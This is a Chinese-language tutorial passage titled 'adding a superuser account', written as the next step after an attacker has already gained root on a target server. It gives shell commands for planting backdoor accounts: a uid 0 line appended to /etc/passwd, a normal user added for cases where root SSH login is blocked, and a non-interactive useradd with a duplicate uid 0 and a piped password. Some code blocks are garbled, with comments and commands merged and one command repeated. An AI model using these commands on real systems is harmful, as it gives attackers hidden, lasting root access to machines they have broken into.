# 二、增加超级用户帐号-教程

前提条件: 假设在攻击的过程中通过利用各种getshell，已经拿到目标服务器root权限

## 2.1 第一种情况：可以交互且允许uid=0的用户远程登录

增加超级用户账号命令：

*   
*   

```
echo "cshm:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号passwd cshm #修改cshm的密码为cshm123
```

![](../Images/9df9f21370a09c6538b9356ac341206a.png)

ssh链接账户cshm：

![](../Images/9b49808e7d9a03957657d4e21e42324d.png)

输入账号：cshm 密码：cshm123 ,成功留下该账户后门，并且是root权限

![](../Images/9d2a85353b9bb526f233eb45f88319cf.png)

## 2.2 第二种情况：可以交互且不允许uid=0的用户远程登录

如果系统不允许 uid=0 的用户远程登录（因为root的uid=0），可以增加一个普通用户账号

设置不允许root账户远程登录，参考链接：https://www.cnblogs.com/binblogs/p/5201307.html

增加超级用户账号命令：

*   
*   

```
echo "wxg:x:1000:1000::/:/bin/sh" >> /etc/passwd  #增加普通用户账号passwd wxg  #修改wxg的密码为wxg147258369
```

之后xhell远程登录wxg测试，成功，但是root账户，及时输入正确的密码也是不能成功登录的

![](../Images/4863fba219a5106873a31e2d7ee86c0c.png)

## 2.3 第三种情况：不交互无回显添加Linux密码

第一种：

*   
*   

```
useradd wxg -u 0 -o -g root -G root|| echo "123456" | passwd --stdin wxg #创建账户wxg、密码123456且为root权限useradd wxg -u 0 -o -g root -G root|| echo "123456" | passwd --stdin wxg #创建账户wxg、密码123456且为root权限
```
